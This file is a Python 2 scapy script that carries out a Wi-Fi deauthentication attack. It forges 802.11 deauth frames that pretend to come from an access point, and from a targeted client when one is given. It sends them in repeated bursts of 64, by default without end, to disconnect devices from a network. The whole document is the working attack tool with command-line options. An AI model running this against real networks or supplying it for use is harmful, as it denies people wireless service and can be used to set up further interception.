#!/usr/bin/python
import argparse
import subprocess
from sys import exit
from scapy.all import *

# Credit: https://gist.githubusercontent.com/jordan-wright/4576966/raw/5f17c9bfb747d6b2b702df3630028a097be8f399/perform_deauth.py
def deauth(iface, ap, client, count, channel):
    subprocess.call(['iwconfig', iface, 'channel', str(channel)])
    pckt = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF':
        cli_to_ap_pckt = Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()
    print 'Sending Deauth to ' + client + ' from ' + ap
    if count == -1: print 'Press CTRL+C to quit'
    # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
        try:
            for i in range(64):
                # Send out deauth from the AP
                send(pckt, iface=iface, verbose=0)
		print 'Sent deauth to ' + client
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt, iface=iface, verbose=0)
            # If count was -1, this will be an infinite loop
            count -= 1
        except KeyboardInterrupt:
            break


def main():
   parser = argparse.ArgumentParser(description='deauth.py - Deauthticate clients from a network')
   parser.add_argument('-i', '--interface', dest='iface', type=str, required=True, help='Interface to use for deauth')
   parser.add_argument('-a', '--ap', dest='ap', type=str, required=True, help='BSSID of the access point')
   parser.add_argument('-c', '--client', dest='client', type=str, required=True, help='BSSID of the client being DeAuthenticated')
   parser.add_argument('-n', '--packets', dest='count', type=int, required=False, default=-1,help='Number of DeAuthentication packets to send')
   parser.add_argument('-ch', '--channel', dest='channel', type=int, required=True, help='Channel which AP and client are on')
   args = parser.parse_args()

   deauth(args.iface, args.ap, args.client, args.count, args.channel)

   exit(0)


if __name__ == '__main__':
    main()

